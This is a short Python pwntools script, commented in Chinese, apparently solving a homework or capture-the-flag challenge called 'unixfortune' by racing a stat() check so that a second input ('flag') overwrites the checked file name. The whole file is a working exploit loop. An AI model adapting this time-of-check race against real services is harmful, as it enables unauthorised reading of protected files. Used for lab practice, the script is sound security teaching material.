#!/usr/bin/env python3
# solve_1.py — Automate race to read flag from unixfortune challenge

from pwn import remote
import time
import re

HOST = 'up.zoolab.org'
PORT = 10931

# 在 stat() 之後覆蓋名稱的延遲，可視網路延遲微調（0.001–0.05 之間）
DELAY = 0.0
# 最多嘗試次數
MAX_TRIES = 10

# flag pattern 正規表示式
FLAG_PATTERN = re.compile(rb"uphw\{.*?\}")


def exploit():
    for attempt in range(1, MAX_TRIES + 1):
        io = remote(HOST, PORT)
        # 等待提示
        io.recvuntil(b".... or type a fortune name to read it.\n")

        # 1) 設定合法檔案，觸發 first thread
        io.sendline(b"fortune000")
        # 3) cw之後再設定成 "flag"（相對路徑）覆蓋 global fortune
        io.sendline(b"flag")

        # 收所有輸出
        data = io.recvall(timeout=1)
        print(data)
        io.close()

        # 檢查是否有 flag
        m = FLAG_PATTERN.search(data)
        if m:
            print(f"[+] Got flag: {m.group(0).decode()}")
            return

        # 每 100 次提示一下
        if attempt % 100 == 0:
            print(f"[-] Attempt {attempt} failed, retrying...")

    print(f"[-] Failed after {MAX_TRIES} tries. Consider adjusting DELAY.")


if __name__ == '__main__':
    exploit()
